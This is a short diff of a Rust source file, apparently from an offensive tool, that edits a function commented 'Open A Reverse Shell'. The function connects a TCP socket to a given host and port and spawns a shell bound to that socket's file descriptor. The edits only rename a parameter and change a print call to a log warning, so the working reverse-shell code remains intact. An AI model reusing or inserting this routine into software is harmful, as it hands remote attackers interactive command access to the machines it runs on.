@@ -9,8 +9,8 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 /* Open A Reverse Shell */
-pub fn shell(ip: String, port: String, shell: String) -> Result<()> {
-    let sock = TcpStream::connect(format!("{}:{}", ip, port))?;
+pub fn shell(host: String, port: String, shell: String) -> Result<()> {
+    let sock = TcpStream::connect(format!("{}:{}", host, port))?;
     let fd = sock.as_raw_fd();
 
     // Open shell
@@ -22,7 +22,7 @@ pub fn shell(ip: String, port: String, shell: String) -> Result<()> {
         .spawn()?
         .wait()?;
 
-    println!("Shell exited");
+    log::warn!("Shell exited");
 
     Ok(())
 }
